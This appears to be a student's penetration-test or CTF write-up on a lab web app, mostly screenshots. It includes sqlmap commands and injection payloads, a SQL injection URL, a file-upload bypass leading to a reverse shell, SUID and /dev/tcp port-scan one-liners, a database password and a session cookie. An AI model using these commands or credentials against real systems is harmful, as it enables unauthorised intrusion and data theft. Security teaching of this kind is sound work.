# Information Gathering

## NMAP

![](https://i.imgur.com/OZhhMCg.png)

## cld-mgmt

![](https://i.imgur.com/JG02NSJ.png) 

directory bruteforcing

![](https://i.imgur.com/5AZclEO.png)



![](https://i.imgur.com/kt7uLGX.png)


![](https://i.imgur.com/55oBEPf.png)


![](https://i.imgur.com/6xxNdSy.png)

bad password


![](https://i.imgur.com/B3Uq7Nq.png)


cld-mgmt/control.inc

![](https://i.imgur.com/zbonsO3.png)


created profile

![](https://i.imgur.com/LqlZCvT.png)


i can basically intercept and change the password, by interception i can literally forward it to be admin instead of my actual email

![](https://i.imgur.com/v5aPPBP.png)

![](https://i.imgur.com/RbI7nor.png)




![](https://i.imgur.com/EmUoNkB.png)


success

![](https://i.imgur.com/zdJAh7H.png)


testing

works

![](https://i.imgur.com/kB99YsG.png)






examine services

![](https://i.imgur.com/5viTSQl.png)


## contact
contact info xss

![](https://i.imgur.com/bHOosBx.png)


![](https://i.imgur.com/b6ZydE8.png)

![](https://i.imgur.com/0X2UxS3.png)


i can also get cookie by this

![](https://i.imgur.com/7mzFUgz.png)



![](https://i.imgur.com/2PwZizf.png)

vuln cookie

![](https://i.imgur.com/IfflLDJ.png)




contact only takes inputname4 which is the name 

![](https://i.imgur.com/BfAjIkP.png)

and is vulnerable to xss

## support

![](https://i.imgur.com/2GhboZE.png)




![](https://i.imgur.com/igAz33d.png)


![](https://i.imgur.com/dt23lxH.png)


![](https://i.imgur.com/HwhX92n.png)


clickjacking in upload

![](https://i.imgur.com/jkliP6z.png)



upload

![](https://i.imgur.com/AuK1ya8.png)


invalid sanitization successful upload 

![](https://i.imgur.com/bMqNlbh.png)


![](https://i.imgur.com/ywp7iIF.png)


looks like we have to add a GIF so that the file type would be considered gif instead of php to bypass filtering
![](https://i.imgur.com/cM002Aa.png)


![](https://i.imgur.com/e1CC4rK.png)




![](https://i.imgur.com/10SFb7n.png)


getting pentest monkey rev shell then open listener
and we successfully gained shell gg

![](https://i.imgur.com/NLlqSKP.png)


find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null >> /dev/shm/2189729.txt



# Available Databases

extracted av dbs using sqlmap by using this command

```bash
└─$ sqlmap -u http://45.84.138.178/cld-mgmt/profile.php --batch --dbs --forms --crawl=2
```

output

```
available databases [6]:
[*] hawkeye
[*] information_schema
[*] mysql
[*] performance_schema
[*] robin
[*] sys
```

![](https://i.imgur.com/UgrDBOH.png)




we can explore two dbs which can be potential hawkeye and robin. others are system db and default ones which i wouldnt find anything potential 

before exploring, i intercepted the loging req and wanted to check which injections can be applied by this command.

```bash
└─$ sqlmap -r Desktop/omar/pentesting/login.req --batch
```
i took the interception from burp and it showed that it has identifies two injection points using POST


```
sqlmap identified the following injection point(s) with a total of 233 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: uname=h@x.y' AND 4354=4354 AND 'OAYN'='OAYN&pw=123&remember=on

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=h@x.y' AND (SELECT 8620 FROM (SELECT(SLEEP(5)))cFCS) AND 'QFOs'='QFOs&pw=123&remember=on
---
```

![](https://i.imgur.com/s74mYza.png)




by this, we will be using the techniques introduced by sqlmap to ease the process as follows:

```bash
--technique=TECH # for the type of the attack
# for example Boolean or Union attack techniques 
U # Union attack
B # Boolean attack
E # Error based
```

since it showed that there are 2 injection points one is time-based and one is boolean. i specified the technique for boolean and ran the command to retrieve the tables of hawkeye.

[sqlmap cheatsheet](https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/)
```bash
┌──(legagog㉿kali)-[~]
└─$ sqlmap -u http://45.84.138.178/cld-mgmt/profile.php --batch -D hawkeye --tables --forms --crawl=2 --threads=5 --technique B
-u # target URL
-r #can be used for request file
--batch # Never ask for user input; use default behavior
--tables # retrieve tables
--forms # parse and test forms on the target url
--crawl # crawl website starting from target url
--threads # concurrent HTTP(s) requests default is 1
```

![](https://i.imgur.com/svTFmrN.png)

```
Database: hawkeye
[1 table]
+---------+
| secrets |
+---------+
```


![](https://i.imgur.com/4xlNVVJ.png)

after retrieving the table which is secrets, i decided to dump it 

![](https://i.imgur.com/Sg7uQ31.png)

and here we got the flag :)

![](https://i.imgur.com/81ORLUQ.png)

```
Database: hawkeye
Table: secrets
[1 entry]
+-----------------------------------------------+
| flag                                          |
+-----------------------------------------------+
| L@sTw@shinetocapture-5Machines-9Vulnerability |
+-----------------------------------------------+
```

I think this gives a clue maybe? 
`LastWashinetocapture-5Machines-9Vulnerability`

now we can explore the other db which is robin


![](https://i.imgur.com/giorvE1.png)

turns out i found that there are 2 tables service and users. 

next up is that i found that the search services is vulnerable to sql injection




![](https://i.imgur.com/epLh0IV.png)


it dumped all tiers especially a premium tier

![](https://i.imgur.com/z76Uczt.png)


the url including injection is as follows

```
http://45.84.138.178/cld-mgmt/search.php?srv=vps'OR+1=1-- -
```



```bash
grep -i -R pass .
-i: incase sensitive
-R recursive getting file by file in dir
.: current  dir
```



![](https://i.imgur.com/GRD3Ojl.png)

![](https://i.imgur.com/A3ZJv9B.png)


i found password `finalfantasy`

![](https://i.imgur.com/PEMCJEK.png)


![](https://i.imgur.com/jPDJpCC.png)


looks like this password is for the database, lets have a look

```bash
for i in {1..65535}; do (< "/dev/tcp/127.0.0.1/$i") &>/dev/null && { echo; echo "[+] Open Port at: $i"; }  || printf "."; done; echo
```

bash port scan 

and this one is bash host discovery

```bash
for i in {1..255}; do (>/dev/tcp/172.17.0.$i/80) 2>/dev/null && echo "172.17.0.$i is up"; done
```

![](https://i.imgur.com/Kd9tcLw.png)

![](https://i.imgur.com/2vCMqVz.png)


to get better shell on this machine

```bash
script /dev/null -c bash
stty raw -echo;fg
enter
enter
export TERM=xterm
stty rows NUM cols NUM
```

so now i actually gained access to the database successfully!

![](https://i.imgur.com/h8TLyTb.png)


![](https://i.imgur.com/JEi55PO.png)

```bash
mysql -h 172.17.0.3 -u mysql -pfinalfantasy
```





# PHPSESSID
b974c9fp3j2scdoq4ch7bdaffg




---
#xss #cw2 #pentesting 

![](https://i.imgur.com/0g2DAB1.jpg)



---
[Bug Hunting in Registration/Sign up feature](https://sm4rty.medium.com/hunting-for-bugs-in-sign-up-register-feature-2021-c47035481212)
[MagibBytes](https://exploit-notes.hdks.org/exploit/web/security-risk/file-upload-attack/)
[sqlmap cheatsheet](https://www.comparitech.com/net-admin/sqlmap-cheat-sheet/)
[Linux Privesc](https://tryhackme.com/room/linuxprivesc)
